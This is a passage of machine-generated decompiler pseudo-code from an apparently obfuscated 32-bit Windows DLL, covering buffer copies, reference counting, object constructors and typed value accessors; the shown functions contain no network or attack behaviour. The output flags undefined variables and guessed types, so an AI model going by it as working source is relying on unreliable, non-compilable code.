  void *Block[3]; // [esp+38h] [ebp-10h] BYREF
  int v20; // [esp+44h] [ebp-4h]

  v3 = *(void **)(a2 + 12);
  v4 = (void *)sub_1000C52E((_DWORD *)a2);
  sub_1000C28D(v3, (int)v17, v4);
  v20 = 0;
  v5 = (void *)this[3];
  v6 = (void *)sub_1000C52E(this);
  sub_1000C28D(v5, (int)v16, v6);
  LOBYTE(v20) = 1;
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) += this[3];
  v7 = operator new(0x14u);
  Block[0] = v7;
  LOBYTE(v20) = 2;
  if ( v7 )
    v8 = (void *)sub_1000C169((int)v7, *(void **)(a2 + 12), 0);
  else
    v8 = 0;
  LOBYTE(v20) = 1;
  Block[0] = v8;
  sub_1000C8D4((int *)Block, 0);
  LOBYTE(v20) = 3;
  sub_1000C8A9((int *)Block, (int *)(a2 + 4));
  LOBYTE(v20) = 1;
  sub_1000C875((int *)Block);
  v14 = Size;
  v9 = (const void *)sub_1000C52E(v17);
  memcpy(*(void **)(v10 + 12), v9, v14);
  v11 = *(_DWORD *)(a2 + 4);
  v15 = v16[3];
  v12 = (const void *)sub_1000C52E(v16);
  memcpy((void *)(Size + *(_DWORD *)(v11 + 12)), v12, v15);
  LOBYTE(v20) = 0;
  sub_1000C45D(v16);
  v20 = -1;
  sub_1000C45D(v17);
  return a2;
}
// 1000C684: variable 'v10' is possibly undefined
// 1000C5DF: using guessed type int var_24[3];

//----- (1000C6CE) --------------------------------------------------------
int __usercall sub_1000C6CE@<eax>(_DWORD *a1@<ebx>, int a2, _DWORD *a3)
{
  sub_1000C3F3(a1, a2);
  sub_1000C5DF(a3, a2);
  return a2;
}

//----- (1000C709) --------------------------------------------------------
int __userpurge sub_1000C709@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4)
{
  sub_1000C38D(a1, a2, a3, a4, 0);
  return a3;
}

//----- (1000C73C) --------------------------------------------------------
int __userpurge sub_1000C73C@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4)
{
  sub_1000C38D(a1, a2, a3, a4, (void *)1);
  return a3;
}

//----- (1000C77C) --------------------------------------------------------
int __thiscall sub_1000C77C(_DWORD *this, int a2)
{
  int v2; // eax

  v2 = sub_1000C52E(this);
  memcpy(&a2, (const void *)(a2 + v2), sizeof(a2));
  return a2;
}

//----- (1000C79D) --------------------------------------------------------
_BYTE *__userpurge sub_1000C79D@<eax>(_DWORD *a1@<esi>, int a2, int Src)
{
  char v3; // bl
  int v4; // eax
  _BYTE *result; // eax

  v3 = *(_BYTE *)(a1[1] + 8);
  v4 = sub_1000C50A(a1);
  result = memcpy((void *)(a2 + v4), &Src, 4u);
  if ( v3 )
  {
    result = (_BYTE *)a1[1];
    result[8] = 1;
  }
  return result;
}

//----- (1000C7D0) --------------------------------------------------------
__int16 __thiscall sub_1000C7D0(_DWORD *this)
{
  const void *v1; // eax
  _DWORD *v3; // [esp+0h] [ebp-4h] BYREF

  v3 = this;
  v1 = (const void *)sub_1000C52E(this);
  memcpy(&v3, v1, 2u);
  return (__int16)v3;
}

//----- (1000C7EE) --------------------------------------------------------
_BYTE *__userpurge sub_1000C7EE@<eax>(_DWORD *a1@<esi>, __int16 Src)
{
  char v2; // bl
  void *v3; // eax
  _BYTE *result; // eax

  v2 = *(_BYTE *)(a1[1] + 8);
  v3 = (void *)sub_1000C50A(a1);
  result = memcpy(v3, &Src, 2u);
  if ( v2 )
  {
    result = (_BYTE *)a1[1];
    result[8] = 1;
  }
  return result;
}

//----- (1000C81E) --------------------------------------------------------
_BYTE *__usercall sub_1000C81E@<eax>(_DWORD *a1@<esi>)
{
  char v1; // bl
  _BYTE *result; // eax
  void *v3; // eax
  size_t v4; // [esp-4h] [ebp-8h]

  v1 = *(_BYTE *)(a1[1] + 8);
  result = (_BYTE *)a1[3];
  if ( result )
  {
    v4 = a1[3];
    v3 = (void *)sub_1000C50A(a1);
    result = memset(v3, 0, v4);
  }
  if ( v1 )
  {
    result = (_BYTE *)a1[1];
    result[8] = 1;
  }
  return result;
}

//----- (1000C84C) --------------------------------------------------------
int *__userpurge sub_1000C84C@<eax>(int *a1@<eax>, int *a2@<ecx>, void *Block)
{
  *a2 = *a1;
  sub_1000C8D4(a2, Block);
  return a2;
}

//----- (1000C875) --------------------------------------------------------
LONG __stdcall sub_1000C875(int *a1)
{
  LONG result; // eax

  result = (LONG)a1;
  if ( *a1 )
    return sub_1000BE8E(*a1);
  return result;
}

//----- (1000C8A9) --------------------------------------------------------
int *__usercall sub_1000C8A9@<eax>(int *a1@<eax>, int *a2@<edi>)
{
  int v2; // eax
  int v3; // ebx

  v2 = *a1;
  v3 = *a2;
  if ( *a2 != v2 )
  {
    *a2 = v2;
    sub_1000C8D4(a2, 0);
    if ( v3 )
      sub_1000BE8E(v3);
  }
  return a2;
}

//----- (1000C8D4) --------------------------------------------------------
LONG __userpurge sub_1000C8D4@<eax>(int *a1@<esi>, void *Block)
{
  LONG result; // eax
  void *v3; // eax
  int v4; // eax

  result = *a1;
  if ( *a1 )
  {
    if ( !*(_BYTE *)(result + 8) && !(_BYTE)Block )
    {
      v3 = operator new(0x14u);
      if ( v3 )
        v4 = sub_1000C1C9((int)v3, *a1);
      else
        v4 = 0;
      *a1 = v4;
    }
    return InterlockedIncrement((volatile LONG *)(*a1 + 4));
  }
  return result;
}

//----- (1000C92B) --------------------------------------------------------
_DWORD *__userpurge sub_1000C92B@<eax>(struct _SECURITY_ATTRIBUTES *a1@<ebx>, _DWORD *a2)
{
  DWORD nLength; // eax
  int v3; // eax
  int v4; // ecx
  int v6; // [esp-Ch] [ebp-34h] BYREF
  _DWORD *v7; // [esp-8h] [ebp-30h]
  int v8; // [esp-4h] [ebp-2Ch]
  int v9[5]; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+24h] [ebp-4h]

  sub_1000C9E0((int)a2);
  v10 = 0;
  v8 = (int)a1;
  v7 = a2 + 3;
  *a2 = &off_100733E8;
  sub_10024AFE((int)v7, v8);
  sub_1000DC03(a2 + 14, 0);
  LOBYTE(v10) = 2;
  a2[16] = 0;
  a2[17] = 0;
  nLength = a1->nLength;
  v8 = 1;
  v3 = (*(int (__thiscall **)(struct _SECURITY_ATTRIBUTES *, int *))(nLength + 36))(a1, v9);
  LOBYTE(v10) = 3;
  v7 = (_DWORD *)v4;
  v6 = v4;
  v9[2] = (int)&v6;
  sub_1000A132(&v6, v3, (int)&unk_1009551C);
  LOBYTE(v10) = 3;
  sub_10025663(a2 + 18, v6, (int)v7, (LPSECURITY_ATTRIBUTES)v8);
  LOBYTE(v10) = 6;
  sub_10009F65(v9);
  return a2;
}
// 1000C97F: variable 'v4' is possibly undefined
// 100733E8: using guessed type int (__thiscall *off_100733E8)(void *Block, char);

//----- (1000C9C0) --------------------------------------------------------
void *__thiscall sub_1000C9C0(void *Block, char a2)
{
  sub_1000CA15((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000C9E0) --------------------------------------------------------
int __stdcall sub_1000C9E0(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10073904;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  *(_DWORD *)a1 = &off_10073380;
  return result;
}
// 10073380: using guessed type int (__thiscall *off_10073380)(void *Block, char);
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);

//----- (1000CA15) --------------------------------------------------------
void __stdcall sub_1000CA15(int a1)
{
  sub_100256D8((_DWORD *)(a1 + 72));
  sub_1000DC42((void **)(a1 + 56));
  sub_10024BBA((int *)(a1 + 12));
  sub_100219E0((_DWORD *)a1);
}

//----- (1000CA5F) --------------------------------------------------------
_DWORD *__thiscall sub_1000CA5F(_DWORD *Block, char a2)
{
  sub_100219E0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000CA7E) --------------------------------------------------------
int __stdcall sub_1000CA7E(int a1, unsigned int a2, unsigned int a3)
{
  _DWORD *v3; // eax
  _DWORD v5[2]; // [esp+10h] [ebp-1Ch] BYREF
  void *v6[4]; // [esp+18h] [ebp-14h] BYREF
  int v7; // [esp+28h] [ebp-4h]

  sub_10012C8B((int *)(a1 + 12), v5);
  v7 = 0;
  ++*(_DWORD *)(a1 + 68);
  sub_10024CB0(a2, a1 + 12, a3);
  v3 = sub_10021E01(v6, (int *)(a1 + 12));
  LOBYTE(v7) = 1;
  sub_1000DC70(v3, a1 + 56);
  LOBYTE(v7) = 0;
  sub_1000DC42(v6);
  **(_DWORD **)(a1 + 92) = *(_DWORD *)(a1 + 68);
  v7 = -1;
  return sub_10012CBF(v5);
}
// 1000CA7E: using guessed type _DWORD var_1C[2];

//----- (1000CAF2) --------------------------------------------------------
int __thiscall sub_1000CAF2(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[6] + 24))(this[6]);
}

//----- (1000CAFA) --------------------------------------------------------
void *__thiscall sub_1000CAFA(void *this, void *a2)
{
  sub_1002557E((int)this + 12, a2);
  return a2;
}

//----- (1000CB2C) --------------------------------------------------------
void __stdcall sub_1000CB2C(_DWORD *a1, int a2, int a3)
{
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-14h] BYREF

  pExceptionObject[4] = 0;
  if ( *a1 != a3 )
  {
    sub_1000CB74(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__);
  }
  sub_1000DB4C((void **)&a1);
}

//----- (1000CB74) --------------------------------------------------------
_DWORD *__stdcall sub_1000CB74(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_10073378;
    sub_1000DEEF(a1 + 1);
  }
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10073360;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10073370;
  return a1;
}
// 10073360: using guessed type int (__stdcall *off_10073360)(char);
// 10073370: using guessed type int (__stdcall *off_10073370)(char);

//----- (1000CBCE) --------------------------------------------------------
void __thiscall sub_1000CBCE(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_1000CCDD((int)(this + 1));
  sub_1000DF1A(v1);
}

//----- (1000CBE0) --------------------------------------------------------
_DWORD *__thiscall sub_1000CBE0(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10073378;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 1, v4);
  }
  sub_1000CC4F(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10073370;
  return this;
}
// 10073370: using guessed type int (__stdcall *off_10073370)(char);

//----- (1000CC4F) --------------------------------------------------------
_DWORD *__thiscall sub_1000CC4F(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10073368;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 1, v4);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10073360;
  return this;
}
// 10073360: using guessed type int (__stdcall *off_10073360)(char);

//----- (1000CCB0) --------------------------------------------------------
_DWORD *__thiscall sub_1000CCB0(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  sub_1000CCDD((int)this);
  sub_1000DF1A(this);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000CCDD) --------------------------------------------------------
int __stdcall sub_1000CCDD(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 - 4) + 4) + a1 - 4) = &off_10073360;
  return result;
}
// 10073360: using guessed type int (__stdcall *off_10073360)(char);

//----- (1000CD06) --------------------------------------------------------
char *__thiscall sub_1000CD06(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_1000CD28(this - 1);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000CD28) --------------------------------------------------------
void __thiscall sub_1000CD28(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD *)(*this + 4);
  v2 = this + 1;
  *(_DWORD *)((char *)v2 + v1 - 4) = &off_10073360;
  sub_1000DF1A(v2);
}
// 10073360: using guessed type int (__stdcall *off_10073360)(char);

//----- (1000CD3D) --------------------------------------------------------
void __stdcall sub_1000CD3D(int a1, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-10h] BYREF

  pExceptionObject[3] = 0;
  if ( !a1 )
  {
    sub_1000E15A(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  sub_1000DB4C((void **)&a1);
}

//----- (1000CD7F) --------------------------------------------------------
void __stdcall sub_1000CD7F(volatile LONG *a1, volatile LONG *lpAddend, volatile LONG *a3)
{
  volatile LONG *v3; // esi
  volatile LONG *v4; // ebx
  volatile LONG *v5; // [esp-4h] [ebp-2Ch] BYREF
  volatile LONG *v6; // [esp+0h] [ebp-28h] BYREF
  volatile LONG *v7; // [esp+4h] [ebp-24h]
  int *v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  v3 = lpAddend;
  v4 = a1;
  v8 = (int *)&v6;
  v7 = lpAddend;
  v6 = a1;
  InterlockedIncrement(lpAddend);
  LOBYTE(v9) = 0;
  sub_1000CD3D((int)v6, (int)v7);
  v7 = a3;
  a3 = (volatile LONG *)&v5;
  v6 = v3;
  v5 = v4;
  InterlockedIncrement(v3);
  LOBYTE(v9) = 0;
  sub_1000CB2C(v5, (int)v6, (int)v7);
  v9 = -1;
  sub_1000DB4C((void **)&a1);
}

//----- (1000CDEB) --------------------------------------------------------
LONG __thiscall sub_1000CDEB(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-38h]
  int v8[8]; // [esp+10h] [ebp-24h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  HIBYTE(a3) = (_BYTE)a3 != 0;
  sub_1000C28D((void *)1, (int)v8, (char *)&a3 + 3);
  v9 = 0;
  v7 = 10;
  v8[5] = (int)v6;
  sub_1000C3F3(v8, (int)v6);
  LOBYTE(v9) = 1;
  v4 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 44))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  return sub_1000C45D(v8);
}

//----- (1000CE4F) --------------------------------------------------------
LONG __thiscall sub_1000CE4F(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-38h]
  int v8[8]; // [esp+10h] [ebp-24h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  sub_1000C28D((void *)1, (int)v8, &a3);
  v9 = 0;
  v7 = 7;
  v8[5] = (int)v6;
  sub_1000C3F3(v8, (int)v6);
  LOBYTE(v9) = 1;
  v4 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 44))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  return sub_1000C45D(v8);
}

//----- (1000CEA9) --------------------------------------------------------
LONG __thiscall sub_1000CEA9(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-38h]
  int v8[8]; // [esp+10h] [ebp-24h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  sub_1000C28D((void *)2, (int)v8, &a3);
  v9 = 0;
  v7 = 8;
  v8[5] = (int)v6;
  sub_1000C3F3(v8, (int)v6);
  LOBYTE(v9) = 1;
  v4 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 44))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  return sub_1000C45D(v8);
}

//----- (1000CF03) --------------------------------------------------------
LONG __thiscall sub_1000CF03(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-38h]
  int v8[8]; // [esp+10h] [ebp-24h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  sub_1000C28D((void *)4, (int)v8, &a3);
  v9 = 0;
  v7 = 6;
  v8[5] = (int)v6;
  sub_1000C3F3(v8, (int)v6);
  LOBYTE(v9) = 1;
  v4 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 44))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  return sub_1000C45D(v8);
}

//----- (1000CF5D) --------------------------------------------------------
void __thiscall sub_1000CF5D(int *this, int a2, int a3, int a4)
{
  int v5; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-38h] BYREF
  int v7; // [esp-4h] [ebp-24h]
  _DWORD *v8; // [esp+10h] [ebp-10h]
  int v9; // [esp+1Ch] [ebp-4h]

  v9 = 0;
  v7 = 5;
  v8 = v6;
  sub_10009952((int)&a3, v6);
  LOBYTE(v9) = 1;
  v5 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v5 + 44))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  sub_10009F65(&a3);
}

//----- (1000CFA7) --------------------------------------------------------
LONG __thiscall sub_1000CFA7(int *this, int a2, int a3, int a4)
{
  int v5; // eax
  _DWORD v7[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v8; // [esp-4h] [ebp-38h]
  int v9[8]; // [esp+10h] [ebp-24h] BYREF
  int v10; // [esp+30h] [ebp-4h]

  sub_1000C28D((void *)8, (int)v9, &a3);
  v10 = 0;
  v8 = 9;
  v9[5] = (int)v7;
  sub_1000C3F3(v9, (int)v7);
  LOBYTE(v10) = 1;
  v5 = *this;
  LOBYTE(v10) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v5 + 44))(
    this,
    a2,
    v7[0],
    v7[1],
    v7[2],
    v7[3],
    v7[4],
    v8);
  v10 = -1;
  return sub_1000C45D(v9);
}

//----- (1000D001) --------------------------------------------------------
LONG __thiscall sub_1000D001(int *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // eax
  _DWORD v10[5]; // [esp-18h] [ebp-38h] BYREF
  int v11; // [esp-4h] [ebp-24h]
  _DWORD *v12; // [esp+10h] [ebp-10h]
  int v13; // [esp+1Ch] [ebp-4h]

  v13 = 0;
  v11 = 4;
  v12 = v10;
  sub_1000C3F3(&a3, (int)v10);
  LOBYTE(v13) = 1;
  v8 = *this;
  LOBYTE(v13) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v8 + 44))(
    this,
    a2,
    v10[0],
    v10[1],
    v10[2],
    v10[3],
    v10[4],
    v11);
  v13 = -1;
  return sub_1000C45D(&a3);
}

//----- (1000D04B) --------------------------------------------------------
LONG __thiscall sub_1000D04B(int *this, int a2, int a3, int a4, int a5, void *Block, int a7, _DWORD **a8)
{
  _DWORD *v10; // [esp-Ch] [ebp-38h] BYREF
  volatile LONG *v11; // [esp-8h] [ebp-34h]
  int *v12; // [esp-4h] [ebp-30h]
  _DWORD v13[2]; // [esp+10h] [ebp-1Ch] BYREF
  int v14; // [esp+18h] [ebp-14h] BYREF
  volatile LONG *v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+28h] [ebp-4h]

  v16 = 0;
  sub_10012C8B(this, v13);
  LOBYTE(v16) = 1;
  sub_1000D5EB(this, &v14, a2, (int)a8, Block);
  LOBYTE(v16) = 2;
  v12 = &a3;
  v11 = v15;
  a8 = &v10;
  v10 = (_DWORD *)v14;
  InterlockedIncrement(v15);
  LOBYTE(v16) = 2;
  sub_1000D755(this, a2, v10, v11, v12);
  LOBYTE(v16) = 1;
  sub_1000DB4C((void **)&v14);
  LOBYTE(v16) = 0;
  sub_10012CBF(v13);
  v16 = -1;
  return sub_1000C45D(&a3);
}
// 1000D04B: using guessed type _DWORD var_1C[2];

//----- (1000D0DE) --------------------------------------------------------
bool __thiscall sub_1000D0DE(void *this, int a2)
{
  bool v2; // bl
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 10);
  v5 = 0;
  v2 = *(_BYTE *)sub_1000C55B((int)v4, 0) == 1;
  v5 = -1;
  sub_1000C45D(v4);
  return v2;
}
// 1000D0DE: using guessed type int var_20[7];

//----- (1000D122) --------------------------------------------------------
char __thiscall sub_1000D122(void *this, int a2)
{
  char v2; // bl
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 7);
  v5 = 0;
  v2 = *(_BYTE *)sub_1000C55B((int)v4, 0);
  v5 = -1;
  sub_1000C45D(v4);
  return v2;
}
// 1000D122: using guessed type int var_20[7];

//----- (1000D162) --------------------------------------------------------
__int16 __thiscall sub_1000D162(void *this, int a2)
{
  __int16 v2; // si
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 8);
  v5 = 0;
  v2 = sub_1000C7D0(v4);
  v5 = -1;
  sub_1000C45D(v4);
  return v2;
}
// 1000D162: using guessed type int var_20[7];

//----- (1000D1A2) --------------------------------------------------------
int __thiscall sub_1000D1A2(void *this, int a2)
{
  int v2; // esi
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 6);
  v5 = 0;
  v2 = sub_1000C77C(v4, 0);
  v5 = -1;
  sub_1000C45D(v4);
  return v2;
}
// 1000D1A2: using guessed type int var_20[7];

//----- (1000D1E2) --------------------------------------------------------
int __thiscall sub_1000D1E2(void *this, int a2, int a3)
{
  (*(void (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 68))(this, a2, a3, 4);
  return a2;
}

//----- (1000D219) --------------------------------------------------------
_DWORD *__thiscall sub_1000D219(void *this, _DWORD *a2, int a3)
{
  int v4[5]; // [esp+10h] [ebp-24h] BYREF
  int v5; // [esp+24h] [ebp-10h]
  int v6; // [esp+30h] [ebp-4h]

  v5 = 0;
  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a3, 5);
  v6 = 1;
  sub_1000989D(a2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_1000C45D(v4);
  return a2;
}
// 1000D219: using guessed type int var_24[5];

//----- (1000D263) --------------------------------------------------------
LONG __thiscall sub_1000D263(void *this, int a2)
{
  int *v2; // ecx
  _DWORD v4[5]; // [esp+10h] [ebp-28h] BYREF
  double v5; // [esp+24h] [ebp-14h]
  int v6; // [esp+34h] [ebp-4h]

  (*(void (__thiscall **)(void *, _DWORD *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 9);
  v6 = 0;
  v5 = *(double *)sub_1000C52E(v4);
  v6 = -1;
  return sub_1000C45D(v2);
}
// 1000D292: variable 'v2' is possibly undefined
// 1000D263: using guessed type _DWORD var_28[5];

//----- (1000D2A2) --------------------------------------------------------
int __thiscall sub_1000D2A2(int *this, int a2, int a3, volatile LONG *a4)
{
  volatile LONG *v6; // [esp-Ch] [ebp-3Ch]
  volatile LONG *v7; // [esp-8h] [ebp-38h]
  _DWORD v8[2]; // [esp+10h] [ebp-20h] BYREF
  volatile LONG *v9; // [esp+18h] [ebp-18h] BYREF
  volatile LONG *v10; // [esp+1Ch] [ebp-14h]
  int v11; // [esp+20h] [ebp-10h]
  int v12; // [esp+2Ch] [ebp-4h]

  v11 = 0;
  sub_10012C8B(this, v8);
  v12 = 1;
  sub_1000D692(this, &v9, a3);
  LOBYTE(v12) = 2;
  v7 = v10;
  v6 = v9;
  InterlockedIncrement(v10);
  LOBYTE(v12) = 2;
  sub_1000CD7F(v6, v7, a4);
  sub_1000C3F3((_DWORD *)v9 + 1, a2);
  v11 = 1;
  LOBYTE(v12) = 1;
  sub_1000DB4C((void **)&v9);
  LOBYTE(v12) = 0;
  sub_10012CBF(v8);
  return a2;
}
// 1000D2A2: using guessed type _DWORD var_20[2];

//----- (1000D33A) --------------------------------------------------------
int __thiscall sub_1000D33A(int *this, int a2)
{
  volatile LONG *v3; // ecx
  _DWORD *v4; // eax
  int v5; // esi
  _DWORD *v7; // [esp-10h] [ebp-4Ch]
  volatile LONG *v8; // [esp-8h] [ebp-44h] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-40h]
  bool v10; // [esp+Fh] [ebp-2Dh]
  void *v11; // [esp+10h] [ebp-2Ch]
  volatile LONG *v12; // [esp+14h] [ebp-28h] BYREF
  volatile LONG *v13; // [esp+18h] [ebp-24h]
  _DWORD v14[2]; // [esp+1Ch] [ebp-20h] BYREF
  _DWORD v15[3]; // [esp+24h] [ebp-18h] BYREF
  int v16; // [esp+38h] [ebp-4h]

  sub_10012C8B(this, v15);
  v16 = 0;
  v9 = v3;
  v8 = v3;
  v11 = &v8;
  sub_10009F32(&v8, a2);
  LOBYTE(v16) = 1;
  v4 = sub_10021FA0(this[14], v14);
  LOBYTE(v16) = 2;
  v7 = (_DWORD *)*v4;
  LOBYTE(v16) = 3;
  v10 = sub_100226A2(v7, 2, (int)v8, (int)v9);
  LOBYTE(v16) = 0;
  sub_1000DBA8(v14);
  if ( v10 )
  {
    v5 = 11;
  }
  else
  {
    sub_1000D692(this, &v12, a2);
    LOBYTE(v16) = 4;
    v9 = v13;
    v11 = &v8;
    v8 = v12;
    InterlockedIncrement(v13);
    LOBYTE(v16) = 4;
    sub_1000CD3D((int)v8, (int)v9);
    v5 = *v12;
    LOBYTE(v16) = 0;
    sub_1000DB4C((void **)&v12);
  }
  v16 = -1;
  sub_10012CBF(v15);
  return v5;
}
// 1000D377: variable 'v3' is possibly undefined
// 1000D33A: using guessed type _DWORD var_18[3];
// 1000D33A: using guessed type _DWORD var_20[2];

//----- (1000D447) --------------------------------------------------------
bool __thiscall sub_1000D447(int *this, int a2)
{
  int v3; // ecx
  _DWORD *v4; // eax
  _DWORD *v6; // [esp-10h] [ebp-44h]
  int v7; // [esp-8h] [ebp-3Ch] BYREF
  int v8; // [esp-4h] [ebp-38h]
  bool v9; // [esp+Fh] [ebp-25h]
  void *v10; // [esp+10h] [ebp-24h]
  _DWORD v11[2]; // [esp+14h] [ebp-20h] BYREF
  _DWORD v12[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v13; // [esp+30h] [ebp-4h]

  sub_10012C8B(this, v12);
  v13 = 0;
  v8 = v3;
  v7 = v3;
  v10 = &v7;
  sub_10009F32(&v7, a2);
  LOBYTE(v13) = 1;
  v4 = sub_10021FA0(this[14], v11);
  LOBYTE(v13) = 2;
  v6 = (_DWORD *)*v4;
  LOBYTE(v13) = 3;
  v9 = sub_100226A2(v6, 0, v7, v8);
  LOBYTE(v13) = 0;
  sub_1000DBA8(v11);
  v13 = -1;
  sub_10012CBF(v12);
  return v9;
}
// 1000D484: variable 'v3' is possibly undefined
// 1000D447: using guessed type _DWORD var_18[3];
// 1000D447: using guessed type _DWORD var_20[2];

//----- (1000D4F2) --------------------------------------------------------
int **__stdcall sub_1000D4F2(int *a1, int **a2, int a3, int a4, void *Block)
{
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int *v7; // ecx
  int *v8; // ecx
  int *v9; // ecx
  _DWORD *v10; // ecx
  int *v12; // [esp-Ch] [ebp-50h] BYREF
  int *v13; // [esp-8h] [ebp-4Ch]
  int *v14; // [esp-4h] [ebp-48h]
  int v15[5]; // [esp+10h] [ebp-34h] BYREF
  _DWORD v16[2]; // [esp+24h] [ebp-20h] BYREF
  int v17[2]; // [esp+2Ch] [ebp-18h] BYREF
  int v18; // [esp+34h] [ebp-10h]
  int v19; // [esp+40h] [ebp-4h]

  v19 = 0;
  v18 = 0;
  sub_10012C8B(a1, v16);
  v19 = 1;
  ++a1[17];
  sub_1000C28D(Block, (int)v15, 0);
  LOBYTE(v19) = 2;
  v5 = operator new(0x20u);
  LOBYTE(v19) = 3;
  if ( v5 )
    v6 = sub_100244AF(v15, v5, a4);
  else
    v6 = 0;
  LOBYTE(v19) = 2;
  sub_1000DB0D(a2, (int)v6);
  v14 = v7;
  v13 = v7;
  v14 = a2[1];
  v8 = *a2;
  v18 = 1;
  v13 = v8;
